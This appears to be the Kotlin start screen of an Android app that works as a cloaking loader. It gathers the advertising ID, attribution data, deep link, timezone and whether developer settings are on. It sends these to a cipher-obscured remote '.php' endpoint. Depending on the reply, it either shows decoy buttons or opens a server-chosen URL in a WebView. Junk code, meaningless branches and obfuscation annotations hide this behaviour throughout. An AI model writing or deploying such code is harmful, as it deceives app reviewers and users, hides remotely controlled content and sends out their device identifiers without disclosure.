package com.creativemobile.nnr

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.creativemobile.nnr.databinding.ActivityStartBinding
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.onesignal.OneSignal
import io.michaelrocks.paranoid.Obfuscate
import java.io.IOException
import java.lang.StringBuilder
import java.net.URLEncoder
import java.util.*
import kotlin.concurrent.thread

class StartActivity : AppCompatActivity() {
    lateinit var binding: ActivityStartBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityStartBinding.inflate(layoutInflater)
        setContentView(binding.root)
        val ff = 3

        @Obfuscate
        if (ff == 3){
        OneSignal.initWithContext(this)
        OneSignal.setAppId(getString(R.string.one_signal_keydsa))
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)}

       if (Requsr == null){
           try {
               Requsr = Volley.newRequestQueue(this)
           }catch (e:Exception){
               Log.d("tew", "yer")
           }
       }


        binding.button.setOnClickListener {
            startActivity(Intent(applicationContext, MainActivity::class.java))
            finishAffinity()
        }

        binding.button2.setOnClickListener {
            finish()
        }


        var cc = arrayOf("q","w","e","r","t")
        if (Save(this).saveStr != "") {

            try {
                cc.forEach {
                    when(it){
                        "q" -> cc.set(1,"s")
                        "w" -> cc.set(2,"e")
                        "e" -> cc.set(3,"r")
                        "r" -> cc.set(4,"g")
                        "t" -> cc.set(5,"yy")
                    }
                }
            }catch (e:Exception){
                Log.d("tew", "yer")
            }

            startActivity(
                Intent(
                    this@StartActivity,
                    WebActivity::class.java
                ).putExtra(decod("wtn", 2), Save(this).saveStr)
            )
            finish()
        } else {
            Thread {
                try {
                    GAID = AdvertisingIdClient.getAdvertisingIdInfo(this).id.toString()

                } catch (exception: IOException) {
                    Log.d("ew", "rew")
                    GAID = decod("pwnn", 2)
                } catch (exception: GooglePlayServicesRepairableException) {
                    Log.d("es", "rrs")
                    GAID = decod("pwnn", 2)
                } catch (exception: GooglePlayServicesNotAvailableException) {
                    Log.d("tre", "ytr")
                    GAID = decod("pwnn", 2)
                }

            }.start()
            fb()
            app()
            try {
                appsFlyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(this).toString()
            } catch (e: Exception) {
                appsFlyerUserId = decod("pwnn", 2)
            }

            liveDataAppsFlyer.observe(this) {
                if (it != null) {
                    for (i in it) {
                        val o = 4
                        @Obfuscate
                        if (o == 4) {
                            when (i.key) {
                                decod("ecorckip", 2) -> campaign = try {
                                    i.value.toString()
                                } catch (e: Exception) {
                                    decod("pwnn", 2)
                                }

                                decod("ogfkc_uqwteg", 2) -> mediaSource = try {
                                    i.value.toString()
                                } catch (e: Exception) {
                                    decod("pwnn", 2)
                                }


                                decod("ch_ejcppgn", 2) -> afChannel = try {
                                    i.value.toString()
                                } catch (e: Exception) {
                                    decod("pwnn", 2)
                                }

                                decod("ch_uvcvwu", 2) -> af_status = try {
                                    i.value.toString()
                                } catch (e: Exception) {
                                    decod("pwnn", 2)
                                }

                            }
                        }
                    }
                    buildUrl()
                } else {
                    buildUrl()
                }
            }

        }

    }

    var ss = "cs"
    fun buildUrl() {

        val kdn:String = try {
            "dsj"
        }catch (e:Exception){
            "iiuhds"
        }

        val getAdb: Int = try {
            Settings.Secure.getInt(
                this.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            )
        } catch (e: Exception) {

            1
        }
        val adb: Boolean = getAdb != 0
        val j = 6
        @Obfuscate
        if (j==6){
        val getTmz: String = try {
            TimeZone.getDefault().id.lowercase()
        } catch (e: Exception) {

            ""
        }

        val tmz = try {
            URLEncoder.encode(getTmz, decod("wvh-8",2))
        } catch (e: Exception) {

            ""
        }
        val buildRequestUrl = decod("jvvr://oauvgtkqwuswggp.enkem/oauvgtkqwuswggp/enqcc.rjr", 2) +
                "?${decod(getString(R.string.google_adidHvsg), 2)}=$GAID" +
                "&${decod(getString(R.string.af_useridhsvga), 2)}=$appsFlyerUserId" +
                "&${decod(getString(R.string.fb_deeplinkKicsh), 2)}=$deep" + //encode
                "&${decod(getString(R.string.campaignIHs), 2)}=$campaign" +
                "&${decod(getString(R.string.af_channelIHbs), 2)}=$afChannel" +
                "&${decod(getString(R.string.media_sourceIygsva), 2)}=$mediaSource" +
                "&${decod(getString(R.string.adbhsga), 2)}=$adb" +
                "&${decod(getString(R.string.tmzHfs), 2)}=$tmz" //encode

            Log.d("weq",buildRequestUrl)

        ss = kdn
        con(buildRequestUrl)}
    }

    var q = 0
    fun con(buildRequestUrl: String) {
        try {
            thread(start = true) {

                var random = Random().nextInt(2)
                when (random) {
                    0 -> q= 20
                    1 -> q= 30
                }

                Response().getStringVolley(object : VolleyCallback {
                    override fun onSuccess(result: String) {
                        @Obfuscate
                        if (result == decod("pqv_pqyc", 2)) {
                            binding.progressBar.visibility = View.INVISIBLE
                            binding.button.visibility = View.VISIBLE
                            binding.button2.visibility = View.VISIBLE

                        } else {

                            OneSignal.setExternalUserId(appsFlyerUserId)
                            OneSignal.sendTag(decod("uwd_crr",2), decod("YYN",2))
                            startActivity(
                                Intent(
                                    this@StartActivity,
                                    WebActivity::class.java
                                ).putExtra(decod("wtn", 2), result)
                            )
                            finish()


                        }
                    }

                }, buildRequestUrl, this)
            }

        } catch (e: Exception) {
            Log.d("yyt","wwq")
        }

    }

    var ff = 0
    var jj = ""
    fun fb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(this) {
            try {
                val k = 0
                @Obfuscate
                if (k == 0){
                var a = it?.targetUri.toString()
                deep = URLEncoder.encode(a, decod("wvh-8",2))
                }
            } catch (ex: Exception) {
                deep = decod("pwnn",2)
            }
        }
        try {
            ff = 5 + 4 + 8 + 10 * 40
            jj = ff.toString()
        } catch (e: Exception) {
            ff = 40 * 43
            jj = ff.toString()
        }


    }

    var fj = ""
    fun app() {

        val gf = arrayOf("ee", "fdj", "djdjs", "fdjsk")

        AppsFlyerLib.getInstance()
            .init("XZPXTgyTQQeZiCXAFNrBhA", object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {

                    if (af_status == null) {
                        try {
                            p0?.let {
                                liveDataAppsFlyer.postValue(it) }
                        } catch (e: Exception) {
                            liveDataAppsFlyer.postValue(null)
                        }
                    } else {
                        Log.d("teqq","trew")
                    }
                }

                override fun onConversionDataFail(p0: String?) {
                    try {
                        liveDataAppsFlyer.postValue(null)
                    }catch (e:Exception){
                        Log.d("tew","yre")
                    }


                }

                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
                    try {
                        liveDataAppsFlyer.postValue(null)
                    }catch (e:Exception){
                        Log.d("uei","ifus")
                    }

                }

                override fun onAttributionFailure(p0: String?) {
                    try {
                        liveDataAppsFlyer.postValue(null)
                    }catch (e:Exception){
                        Log.d("tiw","ufhs")
                    }
                }

            }, this)
        AppsFlyerLib.getInstance().start(this)

        fj = try {
            val str = StringBuilder()
            for (i in gf.indices) {
                str.append(gf[i])
            }
            str.toString()

        } catch (e: Exception) {
            "ttt"
        }

    }
}